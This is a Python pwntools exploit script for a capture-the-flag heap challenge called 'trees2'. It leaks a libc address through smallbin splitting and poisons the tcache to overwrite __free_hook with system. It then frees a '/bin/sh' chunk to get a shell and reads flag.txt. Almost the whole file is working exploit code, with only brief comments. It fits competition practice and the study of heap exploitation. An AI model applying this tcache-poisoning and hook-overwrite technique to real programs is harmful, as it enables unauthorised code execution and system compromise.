from time import sleep
from pwn import *

libc = ELF('./libc.so.6')

p = process('./trees2')
#p = remote('pwn.hsctf.com','5009')

def do_make():
	p.sendline('1')

def do_revoke(i):
	p.sendline('2')
	p.sendline(str(i))

def do_edit(i, name, desclen, desc, amount):
	p.sendline('3')
	p.sendline(str(i))
	p.sendline(str(name))
	p.sendline(str(desclen))
	p.sendline(str(desc))
	p.sendline(str(amount))

def do_print(i):
	p.sendline('4')
	p.sendline(str(i))

print('[[ LEAKING LIBC ]]')
NODES = 31
SIZE = 240
print('[MAKING DONATIONS]')
for i in range(NODES):
	do_make()
print('[EDITING DONATIONS]')
for i in range(1,NODES-4):
	do_edit(i, chr(32+i)*8, SIZE, chr(32+i)*32, i)
# NODES-1 will be our problem child
BAD = NODES-3
do_edit(BAD, chr(32+BAD-1)*8, 0, '', BAD-1)
for i in range(BAD+1, NODES+1):
	do_edit(i, chr(32+i)*8, SIZE, chr(32+i)*32, i)
print('[FILLING TCACHE]')
# Fill tcache
EXTRA = 10
for i in range(1,7+1):
	do_revoke(i)
print('[FREE TO SMALLBIN]')
# Goes on smallbin
do_revoke(8)
print('[SPLIT SMALLBIN]')
# Get everything back, breaking the small chunk
for i in range(EXTRA):
	do_make()
print('[LEAK LIBC]')
do_print(32+9)
# Boring extraction procedure
leak = p.recvuntil(b'trees').split(b'\n')
leak = leak[-1].split(b' ')[1]
leak = int(''.join(chr(c) for c in leak))
libc.address = leak - 0x7f9834b14ca0 + 0x7f9834930000 
print('=== LIBC_BASE : {} ==='.format(hex(libc.address)))
HOOK = libc.symbols['__free_hook']
SYSTEM = libc.symbols['system']
print('=== FREE_HOOK : {} ==='.format(hex(HOOK)))
print('=== SYSTEM : {} ==='.format(hex(SYSTEM)))

print('[[ POISONING TCACHE ]]')
print('[OPEN TCACHE]')
# Make space on tcache
do_edit(NODES+1, '', SIZE, '', 0)
print('[CLOSE TCACHE]')
# Now we use the problem child
# Free next chunk onto tcache
do_revoke(BAD+1)
pad = 'A'*32
address = ''.join(chr(c) for c in p64(HOOK))
print('[WRITE HOOK]')
# Write address on fwd
do_edit(BAD, chr(32+BAD-1)*8, 0, pad+address, BAD-1)
print('[HOOK ON TCACHE]')
# Write hook to tcache
# While we're here, place /bin/sh all over
# When we free, it calls free('/bin/sh')
do_edit(40, '/bin/sh', SIZE, '/bin/sh', 0)
print('[SYSTEM ON HOOK]')
# Write system to hook
address = ''.join(chr(c) for c in p64(SYSTEM))
do_edit(39, '/bin/sh', SIZE, address, BAD-1)

print('[[ GETTING SHELL ]]')
# Call free('/bin/sh') = system('/bin/sh')
do_revoke(40)
print('[GETTING FLAG]')
p.sendline('cat flag.txt')
# Boring extraction procedure
flag = p.recvuntil('}\n').strip().split(b'\n')[-1]
flag = flag[flag.index(b'flag'):]
flag = ''.join(chr(c) for c in flag)
print('=== FLAG : "{}" ==='.format(flag))

p.interactive()
p.close()
